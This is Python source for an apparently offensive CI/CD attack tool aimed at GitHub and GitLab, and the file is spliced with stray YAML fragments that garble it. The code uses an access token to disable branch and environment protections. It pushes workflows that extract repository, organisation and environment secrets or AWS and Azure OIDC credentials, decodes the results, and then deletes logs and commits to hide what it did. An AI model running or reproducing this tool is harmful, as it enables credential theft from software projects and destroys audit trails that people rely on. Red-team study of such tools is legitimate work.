    def subscriptionId(self, value):
        self._subscriptionId = value

    @property
    def clientId(self):
        return self._clientId

    @clientId.setter
    def clientId(self, value):
        self._clientId = value

    @property
    def role(self):
        return self._role

    @role.setter
    def role(self, value):
        self._role = value

    @property
    def region(self):
        return self._region

    @region.setter
    def region(self, value):
        self._region = value

    @property
    def disableProtections(self):
        return self._disableProtections

    @disableProtections.setter
    def disableProtections(self, value):
        self._disableProtections = value

    @property
    def writeAccessFilter(self):
        return self._writeAccessFilter

    @writeAccessFilter.setter
    def writeAccessFilter(self, value):
        self._writeAccessFilter = value

    @property
    def branchAlreadyExists(self):
        return self._branchAlreadyExists

    @branchAlreadyExists.setter
    def branchAlreadyExists(self, value):
        self._branchAlreadyExists = value

    @property
    def pushedCommitsCount(self):
        return self._pushedCommitsCount

    @pushedCommitsCount.setter
    def pushedCommitsCount(self, value):
        self._pushedCommitsCount = value

    @property
    def forceDeploy(self):
        return self._forceDeploy

    @forceDeploy.setter
    def forceDeploy(self, value):
        self._forceDeploy = value

    @property
    def cleanLogs(self):
        return self._cleanLogs

    @cleanLogs.setter
    def cleanLogs(self, value):
        self._cleanLogs = value

    def __createLogDir(self):
        self._cicd.outputDir = realpath(self._cicd.outputDir) + "/github"
        makedirs(self._cicd.outputDir, exist_ok=True)

    @staticmethod
    def __createWorkflowDir():
        makedirs(".github/workflows", exist_ok=True)

    def __extractWorkflowOutput(self, repo):
        name = self._fileName.strip(".zip")
        with ZipFile(f"{self._cicd.outputDir}/{repo}/{self._fileName}") as zipOutput:
            zipOutput.extractall(f"{self._cicd.outputDir}/{repo}/{name}")

    def __extractSensitiveInformationFromWorkflowResult(self, repo, informationType="Secrets"):
        filePath = self.__getWorkflowOutputFileName(repo)
        if filePath:
            with open(filePath, "r") as output:
                # well it's working
                data = output.readlines()[-1].split(" ")[1]

                try:
                    secrets = base64.b64decode(base64.b64decode(data))
                except Exception as e:
                    logger.exception(e)
            logger.success(f"{informationType}:")
            logger.raw(secrets, logging.INFO)

            with open(f"{self._cicd.outputDir}/{repo}/{informationType.lower().replace(' ', '_')}.txt", "ab") as file:
                file.write(secrets)

    def __getWorkflowOutputFileName(self, repo):
        name = self._fileName.strip(".zip")
        filePaths = glob.glob(f"{self._cicd.outputDir}/{repo}/{name}/init/*_{self._taskName}*.txt")
        logger.debug(filePaths)
        logger.debug(f"{self._cicd.outputDir}/{repo}/{name}/init/*_{self._taskName}*.txt")
        if len(filePaths) > 0:
            filePath = filePaths[0]
            return filePath

        else:
            logger.success(f"Data is accessible here: {self._cicd.outputDir}/{repo}/{name}/")
            return None

    def __displayCustomWorkflowOutput(self, repo):
        filePath = self.__getWorkflowOutputFileName(repo)
        if filePath:
            with open(filePath, "r") as output:
                logger.success("Workflow output:")
                line = output.readline()
                while line != "":
                    logger.raw(line, logging.INFO)
                    line = output.readline()

    def createYaml(self, repo, workflowType):

        workflowGenerator = WorkflowGenerator()

        if workflowType == "awsoidc":
            workflowGenerator.generateWorkflowForOIDCAWSTokenGeneration(self._role, self._region, self._env)
        elif workflowType == "azureoidc":
            workflowGenerator.generateWorkflowForOIDCAzureTokenGeneration(
                self._tenantId, self._subscriptionId, self._clientId, self._env
            )
        else:
            repo = self._cicd.org + "/" + repo

            if self._env:
                try:
                    secrets = self._cicd.listSecretsFromEnv(repo, self._env)
                except GitHubError as e:
                    # FIXME: Raise an Exception here
                    logger.exception(e)
            else:
                secrets = self._cicd.listSecretsFromRepo(repo)

            if len(secrets) > 0:
                workflowGenerator.generateWorkflowForSecretsExtraction(secrets, self._env)
            else:
                logger.info("No secret found.")

        logger.success("YAML file: ")
        workflowGenerator.displayYaml()
        workflowGenerator.writeFile(self._workflowFilename)

    def __extractSecretsFromRepo(self, repo):
        logger.info(f'Getting secrets from repo: "{repo}"')
        secrets = []

        try:
            if self._extractRepo:
                secrets += self._cicd.listSecretsFromRepo(repo)
                # we can't extract dependabot secrets from regular workflows
                # secrets += self._cicd.listDependabotSecretsFromRepo(repo)
            if self._extractOrg:
                secrets += self._cicd.listOrganizationSecretsFromRepo(repo)
                # we can't extract dependabot secrets from regular workflows
                # secrets += self._cicd.listDependabotOrganizationSecrets()
        except GitHubError as e:
            logger.error(e)

        if len(secrets) > 0:
            workflowGenerator = WorkflowGenerator()
            workflowGenerator.generateWorkflowForSecretsExtraction(secrets)

            if self.__generateAndLaunchWorkflow(repo, workflowGenerator, "repo", self._env):
                self.__extractSensitiveInformationFromWorkflowResult(repo)

        else:
            logger.info("No secret found")

        logger.empty_line()

    def __extractSecretsFromSingleEnv(self, repo, env):
        logger.info(f'Getting secrets from environment: "{env}" ({repo})')
        secrets = []

        try:
            secrets = self._cicd.listSecretsFromEnv(repo, env)
        except GitHubError as e:
            logger.error(e)

        if len(secrets) > 0:
            workflowGenerator = WorkflowGenerator()
            workflowGenerator.generateWorkflowForSecretsExtraction(secrets, env)

            if self.__generateAndLaunchWorkflow(repo, workflowGenerator, f"env_{env}", env):
                self.__extractSensitiveInformationFromWorkflowResult(repo)

        else:
            logger.info("No secret found")

        logger.empty_line()

    def __extractSecretsFromAllEnv(self, repo):
        for env in self._cicd.listEnvFromrepo(repo):
            self.__extractSecretsFromSingleEnv(repo, env)

    def __extractSecretsFromEnv(self, repo):
        if self._env:
            self.__extractSecretsFromSingleEnv(repo, self._env)
        else:
            self.__extractSecretsFromAllEnv(repo)

    def __generateAndLaunchWorkflow(self, repo, workflowGenerator, outputName, env=None):

        policyId = waitTime = reviewers = branchPolicy = envDetails = None

        try:

            # disable env protection before launching the workflow if no '--force' and env is not null
            if not self._forceDeploy and env:

                # check protection and if enabled return the protections
                envDetails = self.__isEnvProtectionsEnabled(repo, env)
                if envDetails and len(envDetails.get("protection_rules")):

                    # if --disable-protection disable the env protections
                    if self._disableProtections:
                        (
                            policyId,
                            waitTime,
                            reviewers,
                            branchPolicy,
                        ) = self.__disableEnvProtections(repo, envDetails)
                    else:
                        raise Exception("Environment protection rule enabled but '--disable-protections' not activated")

            # start the workflow
            workflowId, workflowConclusion = self.__launchWorkflow(repo, workflowGenerator)

            # check workflow status and get result if it's ok
            return self.__postProcessingWorkflow(repo, workflowId, workflowConclusion, outputName)

        except GitPushError as e:
            pass

        except Exception as e:
            logger.error(f"Error: {e}")
            if logger.getEffectiveLevel() == logging.DEBUG:
                logger.exception(e)

        finally:

            # restore protections
            if self._disableProtections and envDetails:
                self.__restoreEnvProtections(repo, env, policyId, waitTime, reviewers, branchPolicy)

    def __launchWorkflow(self, repo, workflowGenerator):
        logger.verbose(f"Launching workflow.")

        workflowGenerator.writeFile(f".github/workflows/{self._workflowFilename}")

        pushOutput = Git.gitPush(self._cicd.branchName)
        pushOutput.wait()

        if b"Everything up-to-date" in pushOutput.communicate()[1].strip():
            logger.error("Error when pushing code: Everything up-to-date")
            logger.warning("Your trying to push the same code on an existing branch, modify the yaml file to push it.")
            raise GitPushError

        elif pushOutput.returncode != 0:
            logger.error("Error when pushing code:")
            logger.raw(pushOutput.communicate()[1], logging.INFO)
            raise GitPushError

        else:
            self._pushedCommitsCount += 1

            logger.raw(pushOutput.communicate()[1])
            workflowId, workflowConclusion = self._cicd.waitWorkflow(repo, self._workflowFilename)

            return workflowId, workflowConclusion

    def __postProcessingWorkflow(self, repo, workflowId, workflowConclusion, outputName):

        if workflowId and workflowConclusion == "success":
            logger.success("Workflow has successfully terminated.")
            self._fileName = self._cicd.downloadWorkflowOutput(
                repo,
                f"{outputName.replace('/','_').replace(' ', '_')}",
                workflowId,
            )
            self.__extractWorkflowOutput(repo)
            return True
        elif workflowId and workflowConclusion == "failure":
            logger.error("Workflow failure:")
            for reason in self._cicd.getFailureReason(repo, workflowId):
                logger.error(f"{reason}")
            return False
        else:
            return False

    def listGitHubRepos(self):
        logger.info("Listing all repos:")
        for r in self._cicd.repos:
            logger.raw(f"- {r}\n", level=logging.INFO)

    def listGitHubSecrets(self):
        logger.info("Listing secrets:")
        if self._extractOrg:
            self.__displayDependabotOrgSecrets()

        for repo in self._cicd.repos:
            logger.info(f'"{repo}" secrets')

            if self._extractRepo:
                self.__displayRepoSecrets(repo)

            if self._extractEnv:
                self.__displayEnvSecrets(repo)

            if self._extractOrg:
                self.__displayOrgSecrets(repo)

    def __displayRepoSecrets(self, repo):
        try:
            secrets = self._cicd.listSecretsFromRepo(repo)
            displayRepoSecrets(secrets)

            secrets = self._cicd.listDependabotSecretsFromRepo(repo)
            displayDependabotRepoSecrets(secrets)
        except Exception:
            if logger.getEffectiveLevel() == NordStreamLog.VERBOSE:
                logger.error("Can't get repo secrets.")

    def __displayEnvSecrets(self, repo):
        try:
            envs = self._cicd.listEnvFromrepo(repo)
        except Exception:
            if logger.getEffectiveLevel() == NordStreamLog.VERBOSE:
                logger.error("Can't list environment.")
            return

        for env in envs:
            try:
                secrets = self._cicd.listSecretsFromEnv(repo, env)
                displayEnvSecrets(env, secrets)
            except Exception:
                if logger.getEffectiveLevel() == NordStreamLog.VERBOSE:
                    logger.error(f"Can't get secrets for env {env}.")

    def __displayOrgSecrets(self, repo):
        try:
            secrets = self._cicd.listOrganizationSecretsFromRepo(repo)
            displayOrgSecrets(secrets)
        except Exception:
            if logger.getEffectiveLevel() == NordStreamLog.VERBOSE:
                logger.error("Can't get org secrets.")

    def __displayDependabotOrgSecrets(self):
        try:
            secrets = self._cicd.listDependabotOrganizationSecrets()
            displayDependabotOrgSecrets(secrets)
        except Exception:
            if logger.getEffectiveLevel() == NordStreamLog.VERBOSE:
                logger.error("Can't get org secrets.")

    def getRepos(self, repo):

        try:
            if repo:
                if exists(repo):
                    with open(repo, "r") as file:
                        for repo in file:
                            self._cicd.addRepo(repo.strip())

                else:
                    self._cicd.addRepo(repo)

            else:
                self._cicd.listRepos()

        except GitHubBadCredentials:
            logger.fatal("Invalid token.")

        if self._writeAccessFilter:
            self._cicd.filterWriteRepos()

        if len(self._cicd.repos) == 0:
            if self._writeAccessFilter:
                logger.critical("No repository with write access found.")
            else:
                logger.critical("No repository found.")

    def manualCleanLogs(self):
        logger.info("Deleting logs")
        for repo in self._cicd.repos:
            self._cicd.cleanAllLogs(repo, self._workflowFilename)

    def manualCleanBranchPolicy(self):
        logger.info("Deleting deployment branch policy")
        for repo in self._cicd.repos:
            self._cicd.deleteDeploymentBranchPolicyForAllEnv(repo)

    def __runCustomWorkflow(self, repo):
        logger.info(f"Running custom workflow: {self._yaml}")

        workflowGenerator = CustomGenerator()
        workflowGenerator.loadFile(self._yaml)

        self._workflowFilename = basename(self._yaml)

        if self.__generateAndLaunchWorkflow(repo, workflowGenerator, "custom", self._env):
            self.__displayCustomWorkflowOutput(repo)

        logger.empty_line()

    def __runOIDCTokenGenerationWorfklow(self, repo):

        workflowGenerator = WorkflowGenerator()
        if self._tenantId is not None and self._clientId is not None:
            logger.info("Running OIDC Azure access tokens generation workflow")
            informationType = "OIDC access tokens"
            workflowGenerator.generateWorkflowForOIDCAzureTokenGeneration(
                self._tenantId, self._subscriptionId, self._clientId, self._env
            )
        else:
            logger.info("Running OIDC AWS credentials generation workflow")
            informationType = "OIDC credentials"
            workflowGenerator.generateWorkflowForOIDCAWSTokenGeneration(self._role, self._region, self._env)

        if self.__generateAndLaunchWorkflow(repo, workflowGenerator, "oidc", self._env):
            self.__extractSensitiveInformationFromWorkflowResult(repo, informationType=informationType)

        logger.empty_line()

    def __runSecretsExtractionWorkflow(self, repo):
        if self._extractRepo or self._extractOrg:
            self.__extractSecretsFromRepo(repo)

        if self._extractEnv:
            self.__extractSecretsFromEnv(repo)

    def __deleteRemoteBranch(self):
        logger.verbose("Deleting remote branch")
        deleteOutput = Git.gitDeleteRemote(self._cicd.branchName)
        deleteOutput.wait()

        if deleteOutput.returncode != 0:
            logger.error(f"Error deleting remote branch {self._cicd.branchName}")
            logger.raw(deleteOutput.communicate()[1], logging.INFO)
            return False
        return True

    def __clean(self, repo, cleanRemoteLogs=True):

        if self._pushedCommitsCount > 0:

            if cleanRemoteLogs:
                logger.info("Cleaning logs.")

                try:

                    self._cicd.cleanAllLogs(repo, self._workflowFilename)

                except Exception as e:
                    logger.error(f"Error while cleaning logs: {e}")
                    if self._cicd.isGHSToken():
                        logger.warn(f"This might be due to the GHS token.")

            logger.verbose("Cleaning commits.")
            if self._branchAlreadyExists and self._cicd.branchName != self._cicd.defaultBranchName:
                Git.gitUndoLastPushedCommits(self._cicd.branchName, self._pushedCommitsCount)
            else:
                if not self.__deleteRemoteBranch():
                    logger.info("Cleaning remote branch.")
                    # rm everything if we can't delete the branch (only leave one file otherwise it will try to rm the branch)
                    Git.gitCleanRemote(self._cicd.branchName, leaveOneFile=True)

    def start(self):

        for repo in self._cicd.repos:
            logger.success(f'"{repo}"')

            url = f"https://foo:{self._cicd.token}@github.com/{repo}"
            Git.gitClone(url)

            repoShortName = repo.split("/")[1]
            chdir(repoShortName)
            self._pushedCommitsCount = 0
            self._branchAlreadyExists = Git.gitRemoteBranchExists(self._cicd.branchName)
            Git.gitInitialization(self._cicd.branchName, branchAlreadyExists=self._branchAlreadyExists)

            try:

                # check and disable branch protection rules
                protections = None
                if not self._forceDeploy:
                    protections = self.__checkAndDisableBranchProtectionRules(repo)

                self.__createWorkflowDir()
                self.__dispatchWorkflow(repo)

            except KeyboardInterrupt:
                pass

            except Exception as e:
                logger.error(f"Error: {e}")
                if logger.getEffectiveLevel() == logging.DEBUG:
                    logger.exception(e)

            finally:

                self.__clean(repo, cleanRemoteLogs=self._cleanLogs)

                # if we are working with the default nord-stream branch we managed to
                # delete the branch during the previous clean operation

                if self._cicd.branchName != self._cicd.defaultBranchName:
                    if protections:
                        self.__resetBranchProtectionRules(repo, protections)

                chdir("../")
                subprocess.Popen(f"rm -rfd ./{repoShortName}", shell=True).wait()

        logger.info(f"Check output: {self._cicd.outputDir}")

    def __dispatchWorkflow(self, repo):
        if self._yaml:
            self.__runCustomWorkflow(repo)
        elif self._exploitOIDC:
            self.__runOIDCTokenGenerationWorfklow(repo)
        else:
            self.__runSecretsExtractionWorkflow(repo)

    def __checkAllEnvSecurity(self, repo):

        try:
            for env in self._cicd.listEnvFromrepo(repo):
                self.__checkSingleEnvSecurity(repo, env)
        except GitHubError as e:
            logger.error(f"Error while getting env security: {e}")
            if self._cicd.isGHSToken():
                logger.warn(f"This might be due to the GHS token.")

    def __checkSingleEnvSecurity(self, repo, env):
        envDetails = self._cicd.getEnvDetails(repo, env)
        displayEnvSecurity(envDetails)

    def checkBranchProtections(self):
        for repo in self._cicd.repos:
            logger.info(f'Checking security: "{repo}"')
            # TODO: check branch wide protection
            # For now, it's not available in the REST API. It could still be performed using the GraphQL API.
            # https://github.com/github/safe-settings/issues/311
            protectionEnabled = False

            url = f"https://foo:{self._cicd.token}@github.com/{repo}"
            Git.gitClone(url)

            repoShortName = repo.split("/")[1]
            chdir(repoShortName)
            self._pushedCommitsCount = 0
            self._branchAlreadyExists = Git.gitRemoteBranchExists(self._cicd.branchName)
            Git.gitInitialization(self._cicd.branchName, branchAlreadyExists=self._branchAlreadyExists)

            try:
                protectionEnabled, protection = self.__checkAndGetBranchProtectionRules(repo)

                if protectionEnabled:
                    if protection:
                        displayBranchProtectionRules(protection)
                    else:
                        logger.info(
                            "Not enough privileges to get protection rules or 'Restrict pushes that create matching branches' is enabled. Check another branch."
                        )

                self.__checkAllEnvSecurity(repo)

            except Exception as e:
                if logger.getEffectiveLevel() == logging.DEBUG:
                    logger.exception(e)
            finally:
                # don't clean remote logs as we didn't push any workflow here.
                self.__clean(repo, cleanRemoteLogs=False)
                chdir("../")
                subprocess.Popen(f"rm -rfd ./{repoShortName}", shell=True).wait()

    def _checkBranchProtectionRules(self, repo):
        protectionEnabled = False

        try:
            protectionEnabled = self._cicd.checkBranchProtectionRules(repo)
        except GitHubError:
            pass

        if not protectionEnabled:
            fileName = randomString(5) + "_test_push.md"
            Git.gitCreateDummyFile(fileName)
            pushOutput = Git.gitPush(self._cicd.branchName)
            pushOutput.wait()

            if pushOutput.returncode != 0:
                logger.error("Error when pushing code:")
                logger.raw(pushOutput.communicate()[1], logging.INFO)
                return True
            else:
                self._pushedCommitsCount += 1

            try:
                protectionEnabled = self._cicd.checkBranchProtectionRules(repo)
            except GitHubError:
                pass
        return protectionEnabled

    def __checkAndDisableBranchProtectionRules(self, repo):

        protectionEnabled, protection = self.__checkAndGetBranchProtectionRules(repo)

        if protectionEnabled:

            if protection:
                displayBranchProtectionRules(protection)
            else:
                logger.info(
                    "Not enough privileges to get protection rules or 'Restrict pushes that create matching branches' is enabled. Check another branch."
                )

            if protection and self.disableProtections:
                if self._cicd.branchName != self._cicd.defaultBranchName:
                    logger.warning("Removing branch protection, wait until it's restored.")
                else:
                    # no need to restore branch protection if we are working with the default
                    # nord-stream branch
                    logger.warning("Removing branch protection.")

                self._cicd.disableBranchProtectionRules(repo)
                return protection

            elif self.disableProtections:
                # if we can't list protection this means that we don't have enough privileges
                raise Exception(
                    "Not enough privileges to disable protection rules or 'Restrict pushes that create matching branches' is enabled. Check another branch."
                )
            else:
                raise Exception("branch protection rule enabled but '--disable-protections' not activated")

        return None

    def __checkAndGetBranchProtectionRules(self, repo):
        protectionEnabled = self._checkBranchProtectionRules(repo)

        if protectionEnabled:
            logger.info(f'Found branch protection rule on "{self._cicd.branchName}" branch')
            try:
                protection = self._cicd.getBranchesProtectionRules(repo)
                return True, protection

            except GitHubError:
                return True, None
        else:
            logger.info(f'No branch protection rule found on "{self._cicd.branchName}" branch')
        return False, None

    def __isEnvProtectionsEnabled(self, repo, env):
        envDetails = self._cicd.getEnvDetails(repo, env)
        protectionRules = envDetails.get("protection_rules")

        if len(protectionRules) > 0:
            displayEnvSecurity(envDetails)
            return envDetails

        else:
            logger.verbose("No environment protection rule found")
            return False

        return policyId, waitTime, reviewers, branchPolicy

    def __disableEnvProtections(self, repo, envDetails):
        protectionRules = envDetails.get("protection_rules")
        branchPolicy = envDetails.get("deployment_branch_policy")
        waitTime = 0
        reviewers = []
        policyId = None
        env = envDetails.get("name")

        try:
            logger.warning("Modifying env protection, wait until it's restored.")
            if branchPolicy and branchPolicy.get("custom_branch_policies", False):
                policyId = self._cicd.createDeploymentBranchPolicy(repo, env)

            for protection in protectionRules:
                if protection.get("type") == "required_reviewers":
                    for reviewer in protection.get("reviewers"):
                        reviewers.append(
                            {
                                "type": reviewer.get("type"),
                                "id": reviewer.get("reviewer").get("id"),
                            }
                        )
                if protection.get("type") == "wait_timer":
                    waitTime = protection.get("wait_timer")

            self._cicd.modifyEnvProtectionRules(repo, env, 0, [], branchPolicy)
        except GitHubError:
            raise Exception("Environment protection rule enabled but not enough privileges to disable it.")

        return policyId, waitTime, reviewers, branchPolicy

    def __restoreEnvProtections(self, repo, env, policyId, waitTime, reviewers, branchPolicy):
        logger.warning("Restoring env protections.")
        if policyId is not None:
            self._cicd.deleteDeploymentBranchPolicy(repo, env)
        self._cicd.modifyEnvProtectionRules(repo, env, waitTime, reviewers, branchPolicy)

    def describeToken(self):

        if self._cicd.isGHSToken():
            response = self._cicd.getLoginWithGraphQL().json()
            logger.info("Token information:")
            login = response.get("data").get("viewer").get("login")
            if login != None:
                logger.raw(f"\t- Login: {login}\n", logging.INFO)

        else:
            response = self._cicd.getUser()
            headers = response.headers
            response = response.json()

            logger.info("Token information:")

            login = response.get("login")
            if login != None:
                logger.raw(f"\t- Login: {login}\n", logging.INFO)

            isAdmin = response.get("site_admin")
            if isAdmin != None:
                logger.raw(f"\t- IsAdmin: {isAdmin}\n", logging.INFO)

            email = response.get("email")
            if email != None:
                logger.raw(f"\t- Email: {email}\n", logging.INFO)

            id = response.get("id")
            if id != None:
                logger.raw(f"\t- Id: {id}\n", logging.INFO)

            bio = response.get("bio")
            if bio != None:
                logger.raw(f"\t- Bio: {bio}\n", logging.INFO)

            company = response.get("company")
            if company != None:
                logger.raw(f"\t- Company: {company}\n", logging.INFO)

            tokenScopes = headers.get("x-oauth-scopes")
            if tokenScopes != None:
                scopes = tokenScopes.split(", ")
                if len(scopes) != 0:
                    logger.raw(f"\t- Token scopes:\n", logging.INFO)
                    for scope in scopes:
                        logger.raw(f"\t    - {scope}\n", logging.INFO)

    def __resetBranchProtectionRules(self, repo, protections):

        logger.warning("Restoring branch protection.")

        data = {}

        data["required_status_checks"] = resetRequiredStatusCheck(protections)
        data["required_pull_request_reviews"] = resetRequiredPullRequestReviews(protections)
        data["restrictions"] = resetRestrictions(protections)

        data["enforce_admins"] = protections.get("enforce_admins").get("enabled")
        data["allow_deletions"] = protections.get("allow_deletions").get("enabled")
        data["allow_force_pushes"] = protections.get("allow_force_pushes").get("enabled")
        data["block_creations"] = protections.get("block_creations").get("enabled")

        res = self._cicd.updateBranchesProtectionRules(repo, data)

        msg = res.get("message")
        if msg:
            logger.error(f"Fail to restore protection: {msg}")
            logger.info(f"Raw protections: {protections}") 
    branches: [ "main" ]

jobs: from collections import defaultdict


def resetRequiredStatusCheck(protections):

    res = defaultdict(dict)
    required_status_checks = protections.get("required_status_checks")
    if required_status_checks:

        res["strict"] = required_status_checks.get("strict")
        res["contexts"] = required_status_checks.get("contexts")

        if required_status_checks.get("checks"):
            res["checks"] = required_status_checks.get("checks")

        return dict(res)

    else:
        return None


def resetRequiredPullRequestReviews(protections):

    res = defaultdict(dict)
    required_pull_request_reviews = protections.get("required_pull_request_reviews")

    if required_pull_request_reviews:

        if required_pull_request_reviews.get("dismissal_restrictions"):
            res["dismissal_restrictions"]["users"] = getUsersArray(
                required_pull_request_reviews.get("dismissal_restrictions").get("users")
            )
            res["dismissal_restrictions"]["teams"] = getTeamsOrAppsArray(
                required_pull_request_reviews.get("dismissal_restrictions").get("teams")
            )
            res["dismissal_restrictions"]["apps"] = getTeamsOrAppsArray(
                required_pull_request_reviews.get("dismissal_restrictions").get("apps")
            )

        if required_pull_request_reviews.get("dismiss_stale_reviews"):
            res["dismiss_stale_reviews"] = required_pull_request_reviews.get("dismiss_stale_reviews")

        if required_pull_request_reviews.get("require_code_owner_reviews"):
            res["require_code_owner_reviews"] = required_pull_request_reviews.get("require_code_owner_reviews")

        if required_pull_request_reviews.get("required_approving_review_count"):
            res["required_approving_review_count"] = required_pull_request_reviews.get(
                "required_approving_review_count"
            )

        if required_pull_request_reviews.get("require_last_push_approval"):
            res["require_last_push_approval"] = required_pull_request_reviews.get("require_last_push_approval")

        if required_pull_request_reviews.get("bypass_pull_request_allowances"):
            res["bypass_pull_request_allowances"]["users"] = getUsersArray(
                required_pull_request_reviews.get("bypass_pull_request_allowances").get("users")
            )
            res["bypass_pull_request_allowances"]["teams"] = getTeamsOrAppsArray(
                required_pull_request_reviews.get("bypass_pull_request_allowances").get("teams")
            )
            res["bypass_pull_request_allowances"]["apps"] = getTeamsOrAppsArray(
                required_pull_request_reviews.get("bypass_pull_request_allowances").get("apps")
            )

        return dict(res)

    else:
        return None


def resetRestrictions(protections):

    res = defaultdict(dict)
    restrictions = protections.get("restrictions")

    if restrictions:
        res["users"] = getUsersArray(restrictions.get("users"))
        res["teams"] = getTeamsOrAppsArray(restrictions.get("teams"))
        res["apps"] = getTeamsOrAppsArray(restrictions.get("apps"))

        return dict(res)

    else:
        return None


def getUsersArray(users):
    res = []
    for user in users:
        res.append(user.get("login"))
    return res


def getTeamsOrAppsArray(data):
    res = []
    for e in data:
        res.append(e.get("slug"))
    return res 
  build: import logging

from urllib.parse import urlparse
from os import makedirs, chdir
from os.path import exists, realpath
from nordstream.utils.log import logger
from nordstream.git import Git
import subprocess
import time
from nordstream.utils.errors import GitLabError
from nordstream.yaml.gitlab import GitLabPipelineGenerator


class GitLabRunner:
    _cicd = None
    _writeAccessFilter = False
    _extractProject = True
    _extractGroup = True
    _extractInstance = True
    _yaml = None
    _branchAlreadyExists = False
    _fileName = None
    _cleanLogs = True
    _sleepTime = 0
    _localPath = None

    @property
    def writeAccessFilter(self):
        return self._writeAccessFilter

    @writeAccessFilter.setter
    def writeAccessFilter(self, value):
        self._writeAccessFilter = value

    @property
    def extractProject(self):
        return self._extractProject

    @extractProject.setter
    def extractProject(self, value):
        self._extractProject = value

    @property
    def extractGroup(self):
        return self._extractGroup

    @extractGroup.setter
    def extractGroup(self, value):
        self._extractGroup = value

    @property
    def extractInstance(self):
        return self._extractInstance

    @extractInstance.setter
    def extractInstance(self, value):
        self._extractInstance = value

    @property
    def yaml(self):
        return self._yaml

    @yaml.setter
    def yaml(self, value):
        self._yaml = realpath(value)

    @property
    def branchAlreadyExists(self):
        return self._branchAlreadyExists

    @branchAlreadyExists.setter
    def branchAlreadyExists(self, value):
        self._branchAlreadyExists = value

    @property
    def cleanLogs(self):
        return self._cleanLogs

    @cleanLogs.setter
    def cleanLogs(self, value):
        self._cleanLogs = value

    @property
    def sleepTime(self):
        return self._sleepTime

    @sleepTime.setter
    def sleepTime(self, value):
        self._sleepTime = value

    @property
    def localPath(self):
        return self._localPath

    @localPath.setter
    def localPath(self, value):
        if exists(value):
            self._localPath = value
        else:
            logger.critical("Invalid local project path.")

    def __init__(self, cicd):
        self._cicd = cicd
        self.__createLogDir()

    def __createLogDir(self):
        self._cicd.outputDir = realpath(self._cicd.outputDir) + "/gitlab"
        makedirs(self._cicd.outputDir, exist_ok=True)

    def getProjects(self, project, strict=False, membership=False):
        if project:
            if exists(project):
                with open(project, "r") as file:
                    for p in file:
                        self._cicd.addProject(
                            project=p.strip(), filterWrite=self._writeAccessFilter, strict=strict, membership=membership
                        )

            else:
                self._cicd.addProject(
                    project=project, filterWrite=self._writeAccessFilter, strict=strict, membership=membership
                )
        else:
            self._cicd.addProject(filterWrite=self._writeAccessFilter, membership=membership)

        if len(self._cicd.projects) == 0:
            if self._writeAccessFilter:
                logger.critical("No repository with write access found.")
            else:
                logger.critical("No repository found.")

    def getGroups(self, group):
        if group:
            if exists(group):
                with open(group, "r") as file:
                    for p in file:
                        self._cicd.addGroups(group)

            else:
                self._cicd.addGroups(group)
        else:
            self._cicd.addGroups()

        if len(self._cicd.groups) == 0:
            logger.error("No group found.")

    def listGitLabSecrets(self):
        logger.info("Listing GitLab secrets")

        res = False
        if self._extractInstance:
            res |= self.__listGitLabInstanceSecrets()

        if self._extractGroup:
            res |= self.__listGitLabGroupSecrets()

        if self._extractProject:
            res |= self.__listGitLabProjectSecrets()
            res |= self.__listGitLabProjectSecureFiles()

        if not res:
            logger.warning(
                "You don't have access to any secret, try to deploy a pipeline and exfiltrate environment variables"
            )

    def __listGitLabProjectSecrets(self):
        res = False
        for project in self._cicd.projects:
            try:
                time.sleep(self._sleepTime)
                res |= self.__displayProjectVariables(project)
            except Exception as e:
                logger.error(f"Error while listing secrets for {project.get('name')}: {e}")
        return res

    def __listGitLabProjectSecureFiles(self):
        res = False
        for project in self._cicd.projects:
            try:
                time.sleep(self._sleepTime)
                res |= self.__displayProjectSecureFiles(project)
            except Exception as e:
                logger.error(f"Error while listing secure files for {project.get('name')}: {e}")
        return res

    def __listGitLabGroupSecrets(self):
        res = False
        for group in self._cicd.groups:
            try:
                time.sleep(self._sleepTime)
                res |= self.__displayGroupVariables(group)
            except Exception as e:
                logger.error(f"Error while listing secrets for {group.get('name')}: {e}")
        return res

    def __listGitLabInstanceSecrets(self):
        try:
            return self.__displayInstanceVariables()
        except Exception as e:
            logger.error(f"Error while listing instance secrets: {e}")
            return False

    def __displayProjectVariables(self, project):

        projectName = project.get("path_with_namespace")

        try:
            variables = self._cicd.listVariablesFromProject(project)
            if len(variables) != 0:

                logger.info(f'"{projectName}" project variables')

                for variable in variables:
                    logger.raw(
                        f'\t- {variable["key"]}={variable["value"]} (protected:{variable["protected"]} / hidden:{variable["hidden"]})\n',
                        logging.INFO,
                    )

            variables_inherited = self._cicd.listInheritedVariablesFromProject(project)
            if len(variables_inherited) != 0:

                logger.info(f'"{projectName}" inherited group variables')

                for variable in variables_inherited:
                    logger.raw(
                        f'\t- {variable["key"]}={variable["value"]} (protected:{variable["protected"]} / hidden:{variable["hidden"]})\n',
                        logging.INFO,
                    )

            if (len(variables) > 0) or (len(variables_inherited) > 0):
                return True
        except GitLabError as e:
            if logger.getEffectiveLevel() < logging.INFO:
                logger.info(f'"{projectName}" variables')
                logger.error(f"\t{e}")
        return False

    def __displayProjectSecureFiles(self, project):

        projectName = project.get("path_with_namespace")

        try:
            secFiles = self._cicd.listSecureFilesFromProject(project)
            if len(secFiles) != 0:

                logger.info(f'"{projectName}" secure files')

                for file in secFiles:
                    logger.raw(f'\t- {file["name"]} ({file["path"]})\n', logging.INFO)
                return True
        except GitLabError as e:
            if logger.getEffectiveLevel() < logging.INFO:
                logger.info(f'"{projectName}" secure files')
                logger.error(f"\t{e}")
        return False

    def __displayGroupVariables(self, group):

        groupPath = group.get("full_path")

        try:
            variables = self._cicd.listVariablesFromGroup(group)
            if len(variables) != 0:
                logger.info(f'"{groupPath}" group variables:')

                for variable in variables:
                    logger.raw(
                        f'\t- {variable["key"]}={variable["value"]} (protected:{variable["protected"]} / hidden:{variable["hidden"]})\n',
                        logging.INFO,
                    )
                return True
        except GitLabError as e:
            if logger.getEffectiveLevel() < logging.INFO:
                logger.info(f'"{groupPath}" group variables:')
                logger.error(f"\t{e}")
        return False

    def __displayInstanceVariables(self):
        try:
            variables = self._cicd.listVariablesFromInstance()
            if len(variables) != 0:
                logger.info("Instance variables:")
                for variable in variables:
                    logger.raw(
                        f'\t- {variable["key"]}={variable["value"]} (protected:{variable["protected"]} / hidden:{variable["hidden"]})\n',
                        logging.INFO,
                    )
                return True
        except GitLabError as e:
            if logger.getEffectiveLevel() < logging.INFO:
                logger.info("Instance variables:")
                logger.error(f"\t{e}")
        return False

    def listGitLabProjects(self):
        logger.info("Listing GitLab projects")
        for project in self._cicd.projects:

            repoPath = project.get("path")
